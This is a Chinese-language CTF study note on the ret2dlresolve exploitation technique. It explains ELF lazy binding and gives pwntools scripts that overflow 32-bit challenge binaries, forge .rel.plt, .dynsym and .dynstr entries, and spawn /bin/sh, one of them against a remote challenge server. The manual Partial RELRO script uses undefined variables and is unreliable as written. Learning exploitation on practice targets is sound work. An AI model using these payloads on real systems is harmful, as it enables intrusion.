# 【ret2dlresolve】学习和体会

# 原理

[【精选】ret2dlresolve超详细教程(x86&x64)-CSDN博客](https://blog.csdn.net/qq_51868336/article/details/114644569)

[关于学习ret2_dl_runtime_resolve的总结 - ZikH26 - 博客园](https://www.cnblogs.com/ZIKH26/articles/15944406.html)

[[原创]高级栈溢出之ret2dlresolve详解(x86&x64)，附源码分析-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-266769.htm)

[ret2dlresolve - CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/)

关于ret2dlresolve也是算学了好几天了，其实从原理上就很绕，主要涉及到的就是函数延迟绑定的过程

这篇笔记主要是根据[https://bbs.kanxue.com/thread-266769.htm](https://bbs.kanxue.com/thread-266769.htm)来写的，基本上都是原文内容，建议看原文

这里我画个图，来解释一下`_dl_runtime_resolve(link_map,reloc_offset)`函数

其中：link_map的结构为：

```c
struct link_map {
    Elf64_Addr l_addr;

    char *l_name;

    Elf64_Dyn *l_ld;

    struct link_map *l_next;

    struct link_map *l_prev;

    struct link_map *l_real;

    Lmid_t l_ns;

    struct libname_list *l_libname;
    
    Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息
    ...

    size_t l_tls_firstbyte_offset;

    ptrdiff_t l_tls_offset;

    size_t l_tls_modid;

    size_t l_tls_dtor_count;

    Elf64_Addr l_relro_addr;

    size_t l_relro_size;
    
    unsigned long long l_serial;
    
    struct auditstate l_audit[];
}
```

- `.rel.plt` ：在64位系统中是.rela.plt

```c
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
```

这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 （0x18）字节。

- `.dynsym` : 存储了**动态符号表(Dynamic Symbol Table**)的相关位置，存储了关于动态链接相关的资料。里面的每一个表的名字叫做.symtab，s其中st_name这个值是一个偏移，用来进行在.dynstr查找相关的字符串

```c
typedef struct  
{  
  Elf64_Word    st_name;        /* Symbol name (string tbl index) */  
  unsigned char st_info;        /* Symbol type and binding */  
  unsigned char st_other;       /* Symbol visibility */  
  Elf64_Section st_shndx;       /* Section index */  
  Elf64_Addr    st_value;       /* Symbol value */  
  Elf64_Xword   st_size;        /* Symbol size */  
} Elf64_Sym;
```

- `.dynstr` ：饱含着字符串的表

![https://img-blog.csdnimg.cn/72e18271761845ae8aec6442b76e6a3c.png](https://img-blog.csdnimg.cn/72e18271761845ae8aec6442b76e6a3c.png)

延迟绑定主要的流程用通俗一点的话讲就是：

第一次使用函数，调用对应的`函数@plt`所在的指令。它跳到了got表相应位置（这个位置此时属于第一次执行函数，它指向的其实是`函数@plt`的下一个指令），也就是

![Untitled](Untitled.png)

![Untitled](Untitled%201.png)

![Untitled](Untitled%202.png)

这里push的是`_dl_runtime_resolve`的第二个参数：`reloc_offset`。 然后再`jmp`到`PLT[0]`的位置，也就是`plt表`最开始

在`plt[0]`处先是`push got[1]`，`got[1]`就是`link_map`（链接器的标识信息,后文会讲到），然后`jmp`到`got[2]`处，`got[2]`就是`_dl_runtime_resolve`函数的地址

![Untitled](Untitled%203.png)

```c
_dl_runtime_resolve(link_map,reloc_offset)
```

`PLT[0]`的保存的指针指向`_dl_runtime_resolve`的第一个参数：`link_map`

- 我们用`reloc_offset`找到`.rel.plt`中的对应结构体，再通过`rel_info`在`.dynsym`中找到第`[rel_info >>8]`个结构体，最后通过`st_name`在`.dynstr`中找到第`st_name`个参数，这个参数是个字符串，表示的就是我们要的函数的名字。比如对于`write`函数，这个字符串储存的就是`write\x00`
- 然后将`write\x00`在内存中进行搜索，找到的地址就直接存进`函数@plt`对应的GOT表中

其他过程先不说了，上面两个教程讲的很清楚

这里有一张别的师傅画的图很形象

![Untitled](Untitled%204.png)

# 32 位

RELRO（Relocation Read-Only）是一种安全机制，用于保护程序的某些数据区域，防止这些区域被恶意代码篡改。该机制会将某些区段设置为只读，以防止这些区段中的内容（如 GOT、动态链接信息等）被覆盖。

## NO-**RELRO**

**No RELRO**:

- No RELRO 时，没有对 ELF 文件的任何部分应用 RELRO 保护。
- **`.got`**、**`.dynamic`**等 sections 是可写的，这意味着攻击者如果能够找到程序的漏洞，可能会篡改这些 section 中的内容，执行任意代码。

```python
from pwn import *
from LibcSearcher import *
#sh = process("./pwn")

sh = remote("pwn.challenge.ctf.show",'28216')
elf = ELF("./pwn")
context.log_level='debug'
write_plt = elf.plt['write']
write_got = elf.got['write']

read_plt = elf.plt['read']
read_got = elf.got['read']

main_addr = elf.symbols['main']
leave_ret = 0x08048445
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")

target_addr = 0x8049000 +0x400
strtab_addr = 0x08049804+0x4
ppp_ret = 0x08048629

sh.recvuntil("wPWN!\n")
payload1 = b'a'*(0x6c+4)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(strtab_addr)+p32(4)

payload1 += p32(read_plt)+p32(ppp_ret)+p32(0)+p32(target_addr)+p32(len(dynstr))

payload1 += p32(read_plt) + p32(ppp_ret)+p32(0)+p32(target_addr+0x100)+p32(len("/bin/sh\x00"))

payload1 += p32(0x08048376)+ p32(0xdeadbeef)+p32(target_addr+0x100)

sh.send(payload1)
sh.send(p32(target_addr))
sh.send(dynstr)
sh.send(b"/bin/sh\x00")

sh.interactive()
```

收获：

- 对于这种没有开启RELRO服务的情况（一般不会发生），通过 `elf.get_section_by_name`来进行section的获取整个dynamic，然后找一个空闲的内存空间进行伪造
- ROP链的获取，主要看参数以及将返回地址变为`pop ret`指令，pop数目和参数数目保持一直一致

## Partial-RELRO

开启了partial-relro后，像是`.dynamic section`就是不可更改的了，我们

```python
from pwn import*
context.log_level = 'debug'
context.binary = elf = ELF("./bof")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

p = process('./bof')
base_stage = dlresolve.data_addr
p3_ret = 0x08048649 #pop esi ; pop edi ; pop ebp ; ret
pebp_ret = 0x0804864b #pop ebp ; ret
plt_0 = 0x8048370 # objdump -d -j .plt bof

payload1 = 'a'*112+p32(elf.plt['read'])+p32(p3_ret)+p32(0)+p32(base_stage)+p32(0x200)
payload1 += p32(plt_0) + p32(dlresolve.reloc_index) +  p32(b'dead') + p32(dlresolve.real_args[0])
p.sendafter('!',payload1)
p.send(dlresolve.payload)

p.interactive()
```

使用`pwntools`中的`Ret2dlresolvePayload`模块可以直接解决，主要是因为手动构造的时候存在着bug，不过可以给出手动构造的代码(只构造到了伪造`.dynsym`）

```python
from pwn import *
elf = ELF('./pwn')
context.log_level = 'debug'
 
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']
 
ppp_ret = 0x08048649 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804864b
leave_ret = 0x08048465 # ROPgadget --binary bof --only "leave|ret"
 
stack_size = 0x800
bss_addr = 0x0804a028 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size
 
r = process('./pwn')
 
r.recvuntil('Welcome to CTFshowPWN!\n')
# 把payload2写入bss段，并把栈迁移到bss段
payload = b"a"*offset + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)
payload += p32(pop_ebp_ret) + p32(base_stage) + p32(leave_ret)
 
cmd = "/bin/sh"
plt_0 = 0x8048370 # objdump -d -j .plt bof
# index_offset = 0x20# write's index
rel_plt = 0x08048324 # objdump -s -j .rel.plt bof

#  修改index_offset的代码
# fake_write_addr = base_stage + 28
# fake_arg = fake_write_addr - rel_plt    # arg变量是指.rel.plt结构体距离.rel.plt的偏移
# r_offset = elf.got['write']
# r_info = 0x607 # 对应wirte，由 readelf -r bof 查询
# fake_write = flat(p32(r_offset), p32(r_info)) # 伪造的rel_write

dynsym_base = 0x080481cc  # readelf -S bof
fake_write_addr = base_stage + 28
fake_write_str_addr = base_stage + 36 + align + 0x10
fake_name = fake_write_str_addr - strtab
fake_arg = fake_write_addr - rel_plt
r_offset = elf.got['write']

align = 0x10 - ((base_stage + 28 +8 - dynsym_base) %16)
fake_sym_addr = fake_write_addr+ 0x8 +align
fake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))
r_info = ((((fake_sym_addr - dynsym_base)//16) << 8) | 0x7)
fake_write = flat(p32(r_offset),p32(r_info))
fake_write_str = 'system\x00'

# payload1 = b'a'*4 + p32(plt_0) + p32(index_offset) + b'aaaa' + p32(1) + p32(base_stage+28 )+p32(len(b"/bin/sh\x00"))+ b"/bin/sh\x00"
# payload1.ljust(100,b"a")

# payload2 = b'a'*4 + p32(plt_0)+p32(fake_arg) +b'aaaa' + p32(1) + p32(base_stage+36 )+p32(len(b"/bin/sh\x00"))+ fake_write +b"/bin/sh\x00"
# payload2.ljust(100,b"a")

#payload2 = b'a'*4 + p32(plt_0)+p32(fake_arg) +b'aaaa' + p32(1) + p32(base_stage + 36+16+align )+p32(len(b"/bin/sh\x00"))
#payload2 += fake_write + b'a'*align + fake_sym + b"/bin/sh\x00"
#payload2 = payload2.ljust(100,b"a")

payload2 = b'a'*4 + p32(plt_0)+p32(fake_arg) +b'aaaa' + p32(base_stage + 28+align+16+ len('system\x00') )+ fake_write + b'a'*align + fake_sym + fake_write_str + b"/bin/sh\x00"
payload2 = payload2.ljust(100,b"a")

r.sendline(payload2)
r.interactive()
```

ret2dlresolve的漏洞利用在partial-RELRO上主要是通过对：

`reloc_offset`、`.rel.plt`中的`rel_info`、 `.dynsym`中的`st_name`的这三个地方的伪造

并且都是对其偏移值的伪造，比如说

```python
fake_name = fake_write_str_addr - strtab

r_info = ((((fake_sym_addr - dynsym_base)//16) << 8) | 0x7) 

fake_arg = fake_write_addr - rel_plt
```

# 64位

## partial RELRO

64位的partial RELRO与之前的所有操作都是有区别的
主要看这个博客，关注最后的x64部分

[ret2dlresolve超详细教程(x86&x64)](https://blog.csdn.net/qq_51868336/article/details/114644569)